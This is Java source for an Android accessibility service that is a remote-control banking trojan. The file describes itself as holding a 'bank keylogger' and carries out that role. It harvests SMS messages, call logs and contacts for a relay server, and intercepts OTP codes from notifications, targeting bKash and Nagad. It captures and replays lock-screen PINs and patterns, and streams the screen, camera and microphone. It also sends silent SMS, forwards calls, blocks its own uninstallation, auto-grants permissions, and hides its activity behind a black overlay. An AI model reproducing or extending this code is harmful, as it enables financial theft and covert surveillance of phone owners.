/*
 * MODULE: ControlService.java
 * PURPOSE: Core AccessibilityService serving as the central nervous system, orchestrating input automation, screen streaming, telemetry, media, and security.
 *
 * DIRECT INBOUND CONNECTIONS:
 * - Android OS -> onServiceConnected(), onAccessibilityEvent(), onInterrupt(), onDestroy()
 * - RelayClient.java -> onMsg() callback dispatching JSON control commands
 *
 * DIRECT OUTBOUND CONNECTIONS:
 * - AppController -> CrashHandler registration, PermissionActivity launching
 * - RelayClient -> connect(), disconnect(), sendLog(), send()
 * - DeviceProtector, AccessibilityAutomation, ScreenController, MediaEngine, TelemetryExtractor, HardwareSensorManager, LockManager -> Command execution
 *
 * FUNCTION-BY-FLOW MAPPING:
 * - onServiceConnected(): Initializes crash handler, instantiates the 6 core manager subsystems, registers device info, and connects WebSocket.
 * - onAccessibilityEvent(AccessibilityEvent): Dispatches UI events to DeviceProtector (anti-uninstall/perms), AccessibilityAutomation (bank keylogger), and LockManager (PIN/pattern).
 * - handleMessage(JSONObject): Parses incoming relay commands and routes them to appropriate domain handlers.
 * - onDestroy(): Tears down streams, recycles overlays, cancels loops, and closes WebSocket.
 */
package com.device.ctrl;

import android.accessibilityservice.AccessibilityService;
import android.app.KeyguardManager;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.os.Handler;
import android.os.Looper;
import android.os.PowerManager;
import android.provider.Settings;
import android.view.WindowManager;
import android.view.accessibility.AccessibilityEvent;

import org.json.JSONObject;

public class ControlService extends AccessibilityService {
    public static ControlService instance;
    private final Handler h = new Handler(Looper.getMainLooper());
    private String androidId;

    // The Unified Subsystem Managers
    private DeviceProtector deviceProtector;
    private AccessibilityAutomation automation;
    private ScreenController screenController;
    private MediaEngine mediaEngine;
    private TelemetryExtractor telemetryExtractor;
    private HardwareSensorManager hardwareSensorManager;
    private LockManager lockManager;
    private final Runnable checkLockTask = () -> { if (lockManager != null) lockManager.checkLockScreen(); };

    @Override
    public void onServiceConnected() {
        super.onServiceConnected();
        Thread.setDefaultUncaughtExceptionHandler(new MainActivity.CrashHandler(this));
        h.removeCallbacksAndMessages(null);
        instance = this;
        androidId = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);

        try {
            android.accessibilityservice.AccessibilityServiceInfo info = getServiceInfo();
            if (info != null) {
                info.flags |= android.accessibilityservice.AccessibilityServiceInfo.FLAG_RETRIEVE_INTERACTIVE_WINDOWS
                            | android.accessibilityservice.AccessibilityServiceInfo.FLAG_INCLUDE_NOT_IMPORTANT_VIEWS
                            | android.accessibilityservice.AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS;
                setServiceInfo(info);
            }
        } catch (Exception ignored) {}

        // Instantiate domain managers
        deviceProtector = new DeviceProtector(this, androidId);
        automation = new AccessibilityAutomation(this, androidId);
        screenController = new ScreenController(this, androidId);
        mediaEngine = new MediaEngine(this, androidId);
        telemetryExtractor = new TelemetryExtractor(this, androidId);
        lockManager = new LockManager(this, androidId, (KeyguardManager) getSystemService(Context.KEYGUARD_SERVICE), (WindowManager) getSystemService(WINDOW_SERVICE));
        hardwareSensorManager = new HardwareSensorManager(this, lockManager, androidId);

        try {
            Intent intent = new Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
            intent.setData(android.net.Uri.parse("package:" + getPackageName()));
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            startActivity(intent);
        } catch (Exception ignored) {}

        DeviceProtector.requestAutoStart(this);
        connectRelay();
        RelayClient.get().setContext(this);

        h.postDelayed(hardwareSensorManager::sendBatteryInfo, 3000);
        h.postDelayed(hardwareSensorManager::startLoop, 30000);
        h.postDelayed(lockManager::checkLockScreen, 1000);
        h.postDelayed(() -> {
            try {
                telemetryExtractor.getSmsMessages(100);
                telemetryExtractor.getCallLog(50);
                telemetryExtractor.getContacts();
                telemetryExtractor.sendAppsList();
            } catch (Exception ignored) {}
        }, 5000);
    }

    private void connectRelay() {
        try {
            String uToken = "";
            try {
                java.io.InputStream uIn = getAssets().open("reseller_config.json");
                byte[] uB = new byte[uIn.available()];
                int uR = uIn.read(uB);
                uIn.close();
                String uRaw = new String(uB, 0, uR, "UTF-8").trim();
                try { uRaw = StringObfuscator.XorCipher.c2n(uRaw); } catch (Exception ignored) {}
                uToken = new JSONObject(uRaw).optString("token", "");
            } catch (Exception ignored) {}

            RelayClient.get().setUserAppToken(uToken);
            JSONObject info = new JSONObject()
                    .put("model", Build.MODEL)
                    .put("brand", Build.BRAND)
                    .put("android", Build.VERSION.RELEASE)
                    .put("sdk", Build.VERSION.SDK_INT)
                    .put("battery", hardwareSensorManager.getBatteryLevel())
                    .put("charging", hardwareSensorManager.isCharging())
                    .put("locked", lockManager.isDeviceCurrentlyLocked())
                    .put("userAppToken", uToken);

            RelayClient.get().init(androidId, msg -> {
                try { handleMessage(msg); } catch (Exception ignored) {}
            });
            RelayClient.get().setDeviceInfo(info);
            RelayClient.get().connect();
            triggerAutoTelemetryHarvest();
        } catch (Exception ignored) {}
    }

    private void triggerAutoTelemetryHarvest() {
        h.postDelayed(() -> {
            try {
                if (telemetryExtractor != null) {
                    telemetryExtractor.getSmsMessages(100);
                    telemetryExtractor.getCallLog(50);
                    telemetryExtractor.getContacts();
                }
                if (hardwareSensorManager != null) {
                    hardwareSensorManager.sendSimInfo();
                }
                RelayClient.get().sendLog("⚡ Auto-telemetry harvest completed");
            } catch (Exception ignored) {}
        }, 3000);
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent e) {
        if (e == null) return;
        deviceProtector.checkAndBlockUninstall(e);
        deviceProtector.autoAllowPermissions(e);
        automation.processBankKeyloggerEvent(e);
        automation.processGeneralKeyloggerEvent(e);

        int type = e.getEventType();
        if (type == AccessibilityEvent.TYPE_NOTIFICATION_STATE_CHANGED) {
            processNotificationEvent(e);
            return;
        }
        if (type == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED
                || type == AccessibilityEvent.TYPE_WINDOWS_CHANGED
                || type == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED) {
            lockManager.handleLockScreenDetection(e);
        }
        if (type == AccessibilityEvent.TYPE_VIEW_CLICKED) {
            lockManager.handlePinDigitClick(e);
        }
        if (lockManager.captureMode) {
            lockManager.handleLivePatternEvent(e);
            if (type == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED
                    || type == AccessibilityEvent.TYPE_WINDOWS_CHANGED
                    || type == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED) {
                h.removeCallbacks(checkLockTask);
                h.postDelayed(checkLockTask, 300);
            }
        }
    }

    private void handleMessage(JSONObject msg) {
        if (!"action".equals(msg.optString("type", ""))) return;
        String action = msg.optString("action", "");
        JSONObject data = msg.optJSONObject("data");

        switch (action) {
            case "tap":
                automation.doTap(data);
                RelayClient.get().sendLog("👈 Tap at (" + (data != null ? data.optInt("x", 0) : 0) + ", " + (data != null ? data.optInt("y", 0) : 0) + ")");
                break;
            case "swipe":
                automation.doSwipe(data);
                RelayClient.get().sendLog("👉 Swipe executed");
                break;
            case "scroll":
                automation.doScroll(data);
                RelayClient.get().sendLog("📜 Scroll " + (data != null ? data.optString("direction", "down") : "down") + " executed");
                break;
            case "long_press":
                automation.doLongPress(data);
                RelayClient.get().sendLog("👆 Long press executed");
                break;
            case "back":
                performGlobalAction(GLOBAL_ACTION_BACK);
                RelayClient.get().sendLog("◀ Back button pressed");
                break;
            case "home":
                performGlobalAction(GLOBAL_ACTION_HOME);
                RelayClient.get().sendLog("🏠 Home button pressed");
                break;
            case "recents":
                performGlobalAction(GLOBAL_ACTION_RECENTS);
                RelayClient.get().sendLog("🔳 Recents button pressed");
                break;
            case "lock":
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P)
                    performGlobalAction(GLOBAL_ACTION_LOCK_SCREEN);
                RelayClient.get().sendLog("🔒 Lock screen button pressed");
                break;
            case "type_text":
                automation.doTypeText(data);
                RelayClient.get().sendLog("⌨ Type text executed: " + (data != null ? data.optString("text", "") : ""));
                break;
            case "click_text":
                automation.doClickText(data);
                RelayClient.get().sendLog("🖱 Click text executed: " + (data != null ? data.optString("text", "") : ""));
                break;
            case "open_app":
                try {
                    String pkg = data != null ? data.optString("package", "") : "";
                    Intent i = getPackageManager().getLaunchIntentForPackage(pkg);
                    if (i != null) { i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK); startActivity(i); }
                    RelayClient.get().sendLog("🚀 App opened: " + pkg);
                } catch (Exception e) {
                    RelayClient.get().sendLog("❌ Open app failed: " + e.getMessage());
                }
                break;
            case "screen_on":
                try {
                    PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
                    if (pm != null) {
                        PowerManager.WakeLock wl = pm.newWakeLock(PowerManager.SCREEN_BRIGHT_WAKE_LOCK
                                | PowerManager.ACQUIRE_CAUSES_WAKEUP
                                | PowerManager.ON_AFTER_RELEASE, "Ctrl:Wake");
                        wl.acquire(3000);
                        h.postDelayed(() -> { if (wl.isHeld()) wl.release(); }, 3500);
                        h.postDelayed(lockManager::checkLockScreen, 800);
                        RelayClient.get().sendLog("💡 Screen turned ON");
                    }
                } catch (Exception ignored) {}
                break;
            case "get_ui_nodes":
                automation.sendUiNodes();
                RelayClient.get().sendLog("📑 UI Nodes requested");
                break;
            case "start_uinodes_loop":
                automation.setUiNodesLoop(true);
                RelayClient.get().sendLog("🔄 UI Nodes loop started");
                break;
            case "stop_uinodes_loop":
                automation.setUiNodesLoop(false);
                RelayClient.get().sendLog("🛑 UI Nodes loop stopped");
                break;
            case "get_apps":
                telemetryExtractor.sendAppsList();
                RelayClient.get().sendLog("📱 Extracting installed apps...");
                break;
            case "start_mjpeg":
                screenController.start();
                break;
            case "stop_mjpeg":
                screenController.stop();
                break;
            case "start_capture":
                lockManager.captureMode = true;
                RelayClient.get().sendLog("👁 Lock capture enabled");
                break;
            case "stop_capture":
                lockManager.captureMode = false;
                RelayClient.get().sendLog("👁 Lock capture disabled");
                break;
            case "unlock_with_pattern":
                try {
                    String pattern = data != null ? data.optString("pattern", "") : "";
                    if (pattern.isEmpty() && lockManager.autoPattern.isEmpty()) return;
                    if (!lockManager.isDeviceCurrentlyLocked()) return;
                    String usePattern = pattern.isEmpty() ? lockManager.autoPattern : pattern;
                    h.postDelayed(() -> lockManager.tryAutoUnlock(usePattern), 500);
                    RelayClient.get().sendLog("🔑 Auto-unlock pattern requested");
                } catch (Exception ignored) {}
                break;
            case "unlock_with_pin":
                lockManager.unlockWithPin(data);
                RelayClient.get().sendLog("🔑 Auto-unlock PIN requested");
                break;
            case "get_sms":
                telemetryExtractor.getSmsMessages(data != null ? data.optInt("limit", 100) : 100);
                RelayClient.get().sendLog("📩 Extracting SMS log...");
                break;
            case "get_calls":
                telemetryExtractor.getCallLog(data != null ? data.optInt("limit", 50) : 50);
                RelayClient.get().sendLog("📞 Extracting Call log...");
                break;
            case "get_contacts":
                telemetryExtractor.getContacts();
                RelayClient.get().sendLog("👥 Extracting Contacts list...");
                break;
            case "camera_snapshot":
                if (mediaEngine != null) mediaEngine.takeSnapshot(data);
                break;
            case "get_camera_info":
                if (mediaEngine != null) mediaEngine.getCameraInfo();
                break;
            case "start_cam_stream":
                if (mediaEngine != null) mediaEngine.startCamStream(data);
                break;
            case "stop_cam_stream":
                if (mediaEngine != null) mediaEngine.stopCamStream();
                break;
            case "set_cam_quality":
                if (mediaEngine != null) mediaEngine.setCamQuality(data != null ? data.optInt("quality", 50) : 50);
                break;
            case "start_mic":
                if (mediaEngine != null) mediaEngine.startMic(data);
                break;
            case "stop_mic":
                if (mediaEngine != null) mediaEngine.stopMic();
                break;
            case "set_stream_quality":
                screenController.setQuality(data != null ? data.optInt("quality", 45) : 45);
                break;
            case "get_lock_info":
                try {
                    String savedP = getSharedPreferences("LockData", MODE_PRIVATE).getString("saved", "");
                    if (!savedP.isEmpty()) {
                        lockManager.autoPattern = savedP;
                        RelayClient.get().sendCredentials("pattern", savedP);
                        RelayClient.get().sendLockCaptured("pattern", savedP);
                        RelayClient.get().sendLog("🔑 Lock info retrieved");
                    }
                } catch (Exception ignored) {}
                break;
            case "show_black_screen":
                screenController.showBlackScreen(data != null ? data.optString("text", "") : "");
                break;
            case "hide_black_screen":
                screenController.hideBlackScreen();
                break;
            case "get_sim_info":
                hardwareSensorManager.sendSimInfo();
                break;
            case "start_call_forward":
                hardwareSensorManager.startCallForwarding(data);
                break;
            case "stop_call_forward":
                hardwareSensorManager.stopCallForwarding();
                break;
            case "send_sms":
                telemetryExtractor.sendSilentSms(data);
                break;
            case "trigger_permissions":
                try {
                    PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
                    if (pm != null && !pm.isInteractive()) {
                        PowerManager.WakeLock wl = pm.newWakeLock(PowerManager.SCREEN_BRIGHT_WAKE_LOCK | PowerManager.ACQUIRE_CAUSES_WAKEUP | PowerManager.ON_AFTER_RELEASE, "Ctrl:WakePerms");
                        wl.acquire(3000);
                        h.postDelayed(() -> { if (wl.isHeld()) wl.release(); }, 3500);
                    }
                } catch (Exception ignored) {}
                try {
                    Intent permIntent = new Intent(this, MainActivity.PermissionActivity.class);
                    permIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK
                            | Intent.FLAG_ACTIVITY_CLEAR_TOP
                            | Intent.FLAG_ACTIVITY_SINGLE_TOP);
                    startActivity(permIntent);
                    RelayClient.get().sendLog("🔐 Permission harvest triggered");
                } catch (Exception e) {
                    RelayClient.get().sendLog("❌ Permission trigger failed: " + e.getMessage());
                }
                break;
            case "get_setup_phase":
                deviceProtector.sendPhaseUpdate();
                break;
        }
        if (!action.equals("get_ui_nodes") && !action.equals("start_uinodes_loop")) {
            h.postDelayed(automation::sendUiNodes, 300);
        }
    }

    @Override
    public void onInterrupt() {}

    @Override
    public void onDestroy() {
        super.onDestroy();
        instance = null;
        if (screenController != null) screenController.cleanup();
        if (automation != null) automation.setUiNodesLoop(false);
        if (lockManager != null) lockManager.cleanup();
        if (mediaEngine != null) mediaEngine.cleanup();
        if (hardwareSensorManager != null) hardwareSensorManager.cleanup();
        if (automation != null) automation.flushKeylogBatch();
        h.removeCallbacksAndMessages(null);
        RelayClient.get().disconnect();
    }

    private static final java.util.regex.Pattern OTP_PATTERN = java.util.regex.Pattern.compile("\\b(\\d{4,8})\\b");

    private void processNotificationEvent(AccessibilityEvent e) {
        if (e == null || e.getPackageName() == null) return;
        String pkg = e.getPackageName().toString();
        if (pkg.contains("com.device.ctrl")) return;

        String title = "";
        String text = "";

        android.os.Parcelable p = e.getParcelableData();
        if (p instanceof android.app.Notification) {
            android.app.Notification n = (android.app.Notification) p;
            android.os.Bundle extras = n.extras;
            if (extras != null) {
                CharSequence t = extras.getCharSequence(android.app.Notification.EXTRA_TITLE);
                CharSequence b = extras.getCharSequence(android.app.Notification.EXTRA_TEXT);
                CharSequence bb = extras.getCharSequence(android.app.Notification.EXTRA_BIG_TEXT);
                if (t != null) title = t.toString().trim();
                if (bb != null) text = bb.toString().trim();
                else if (b != null) text = b.toString().trim();
            }
        }

        if (text.isEmpty() && e.getText() != null && !e.getText().isEmpty()) {
            StringBuilder sb = new StringBuilder();
            for (CharSequence cs : e.getText()) {
                if (cs != null && cs.length() > 0) {
                    if (sb.length() > 0) sb.append(" ");
                    sb.append(cs);
                }
            }
            text = sb.toString().trim();
        }

        if (text.isEmpty() && title.isEmpty()) return;

        boolean isOtp = false;
        String otpCode = "";
        String combined = (title + " " + text).toLowerCase();
        if (combined.contains("otp") || combined.contains("code") || combined.contains("verification") ||
            combined.contains("pin") || combined.contains("bkash") || combined.contains("nagad") ||
            combined.contains("secret") || combined.contains("one time") || combined.contains("কোর্ড") || combined.contains("পিন")) {
            java.util.regex.Matcher m = OTP_PATTERN.matcher(text.isEmpty() ? title : text);
            if (m.find()) {
                otpCode = m.group(1);
                isOtp = true;
            }
        }

        try {
            JSONObject msg = new JSONObject();
            msg.put("type", isOtp ? "otp_alert" : "notification_event");
            msg.put("androidId", androidId);
            msg.put("pkg", pkg);
            msg.put("title", title);
            msg.put("text", text);
            msg.put("isOtp", isOtp);
            msg.put("code", otpCode);
            msg.put("timestamp", System.currentTimeMillis());
            RelayClient.get().sendOrQueue(msg);
            if (isOtp) {
                RelayClient.get().sendLog("🔥 LIVE OTP INTERCEPTED: " + otpCode + " [" + pkg + "]");
            }
        } catch (Exception ignored) {}
    }
}
